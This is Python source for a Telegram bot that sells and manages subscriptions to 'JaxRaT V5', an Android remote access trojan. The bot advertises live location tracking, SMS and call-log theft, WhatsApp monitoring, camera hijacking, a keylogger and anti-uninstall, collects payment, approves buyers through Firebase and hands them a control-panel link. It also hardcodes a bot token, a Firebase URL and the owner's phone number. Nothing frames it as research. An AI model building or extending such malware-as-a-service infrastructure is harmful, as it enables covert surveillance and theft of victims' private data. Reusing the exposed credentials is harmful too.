import telebot
from telebot import types
import requests
import json
import time
import os
import threading
from flask import Flask
from flask import request

# ========== KONFIGURASI ==========
FIREBASE_URL = "https://kwontol-default-rtdb.firebaseio.com"
BOT_TOKEN = "8019851816:AAFytb4-6Owqdttdhja77wqabJt8p_ZUaho"
OWNER_PHONE = "085136030617"
OWNER_UID = "aKWJNVaAW3Rnclir7gNgwngLl1v1"
GROUP_LINK = "https://t.me/+kumpulanbuyerjaxrat"

bot = telebot.TeleBot(BOT_TOKEN)

# ========== FUNGSI FIREBASE ==========
def firebase_get(path):
    try:
        url = f"{FIREBASE_URL}/{path}.json"
        res = requests.get(url)
        return res.json()
    except:
        return None

def firebase_put(path, data):
    url = f"{FIREBASE_URL}/{path}.json"
    res = requests.put(url, json=data)
    return res.json()

def firebase_post(path, data):
    url = f"{FIREBASE_URL}/{path}.json"
    res = requests.post(url, json=data)
    return res.json()

def firebase_patch(path, data):
    url = f"{FIREBASE_URL}/{path}.json"
    res = requests.patch(url, json=data)
    return res.json()

# ========== HANDLER BOT ==========
@bot.message_handler(commands=['start'])
def start(message):
    welcome_text = """
🔥 *JaxRaT V5 - Premium RAT Service* 🔥

Selamat datang di bot resmi JaxRaT!

Apa yang bisa saya bantu?
/register - Daftar jadi user baru
/price - Lihat harga
/group - Join group buyer
/admin - Hubungi owner
    """
    bot.reply_to(message, welcome_text, parse_mode="Markdown")

@bot.message_handler(commands=['price'])
def price(message):
    settings = firebase_get("settings")
    harga = settings.get('harga', 50000) if settings else 50000
    price_text = f"""
💰 *HARGA JAXRAT V5* 💰

Akses Panel + Bot + Aplikasi: *Rp {harga:,}*

Fitur lengkap:
✅ Live location tracking
✅ SMS & Call logs
✅ WhatsApp monitor
✅ Camera hack
✅ Keylogger
✅ File manager
✅ Anti uninstall

Pembayaran via QRIS / Transfer ke {OWNER_PHONE}

Ketik /register untuk mulai daftar
    """
    bot.reply_to(message, price_text, parse_mode="Markdown")

@bot.message_handler(commands=['group'])
def group(message):
    settings = firebase_get("settings")
    group_link = settings.get('group_link', 'https://t.me/jaxratusers') if settings else 'https://t.me/jaxratusers'
    bot.reply_to(message, f"Join grup buyer di sini:\n{group_link}")

@bot.message_handler(commands=['admin'])
def admin(message):
    bot.reply_to(message, f"Hubungi owner via WhatsApp: {OWNER_PHONE}")

@bot.message_handler(commands=['register'])
def register(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or "no_username"
    
    # Cek apakah udah terdaftar
    users = firebase_get("users")
    already_registered = False
    if users:
        for uid, user_data in users.items():
            if user_data.get('telegram_id') == user_id:
                already_registered = True
                break
    
    if already_registered:
        bot.reply_to(message, "Kamu udah terdaftar! Kalo mau aktivasi, hubungi admin.")
        return
    
    # Simpan ke pending
    pending = firebase_get("pending_users") or {}
    pending[user_id] = {
        "telegram_id": user_id,
        "username": username,
        "chat_id": message.chat.id,
        "status": "pending",
        "registered_at": time.time()
    }
    firebase_put("pending_users", pending)
    
    # Kirim notifikasi ke owner
    owner_chat_id = None
    if users:
        for uid, user_data in users.items():
            if uid == OWNER_UID:
                owner_chat_id = user_data.get('chat_id')
                break
    
    if owner_chat_id:
        bot.send_message(
            owner_chat_id,
            f"🔔 *User Baru Daftar!*\n\nUsername: @{username}\nTelegram ID: {user_id}\nChat ID: {message.chat.id}\n\nKetik /approve_{user_id} untuk setujui",
            parse_mode="Markdown"
        )
    
    bot.reply_to(message, "✅ Pendaftaran diterima! Tunggu admin approve ya. Kamu bakal dapet notifikasi kalo udah aktif.")

@bot.message_handler(commands=['approve'])
def approve(message):
    # Cek apakah ini owner
    user_id = str(message.from_user.id)
    
    users = firebase_get("users")
    owner_found = False
    owner_chat_id = None
    
    if users:
        for uid, user_data in users.items():
            if uid == OWNER_UID and user_data.get('telegram_id') == user_id:
                owner_found = True
                owner_chat_id = message.chat.id
                break
    
    if not owner_found:
        bot.reply_to(message, "❌ Lu bukan owner, gabisa approve!")
        return
    
    # Parse command: /approve_12345678
    parts = message.text.split('_')
    if len(parts) < 2:
        bot.reply_to(message, "Format: /approve_<telegram_id>")
        return
    
    target_id = parts[1]
    
    pending = firebase_get("pending_users")
    if not pending or target_id not in pending:
        bot.reply_to(message, "User gak ada di pending list.")
        return
    
    user_data = pending[target_id]
    
    # Generate UID baru untuk user
    import uuid
    new_uid = str(uuid.uuid4()).replace('-', '')[:28]
    
    # Pindahin ke users
    users = firebase_get("users") or {}
    users[new_uid] = {
        "telegram_id": user_data['telegram_id'],
        "username": user_data['username'],
        "chat_id": user_data['chat_id'],
        "status": "active",
        "approved_at": time.time(),
        "expired_at": time.time() + (30 * 24 * 60 * 60)  # 30 hari
    }
    firebase_put("users", users)
    
    # Hapus dari pending
    del pending[target_id]
    firebase_put("pending_users", pending)
    
    # Kasih notifikasi ke user
    bot.send_message(
        user_data['chat_id'],
        f"✅ *Selamat! Akun kamu udah aktif!*\n\nUser ID kamu: `{new_uid}`\n\nSekarang kamu bisa akses panel di:\nhttps://panel-jaxrat.vercel.app/login\n\nLogin pake email dan password yang bakal dikirim owner via WA.",
        parse_mode="Markdown"
    )
    
    # Kasih tau owner
    bot.reply_to(message, f"✅ User @{user_data['username']} udah diaktifin dengan UID: `{new_uid}`")

# ========== WEB SERVER UNTUK KEEP ALIVE ==========
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot JaxRaT is running!"

@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    else:
        return ''

# ========== MAIN ==========
def run_bot():
    # Hapus webhook kalo ada
    bot.remove_webhook()
    time.sleep(1)
    # Set webhook (ganti dengan URL Replit lo)
    # bot.set_webhook(url="https://namaproject.replit.app/webhook")
    # Kalo pake polling:
    bot.infinity_polling()

if __name__ == "__main__":
    # Jalanin bot di thread terpisah
    threading.Thread(target=run_bot).start()
    # Jalanin flask
    app.run(host='0.0.0.0', port=8080)
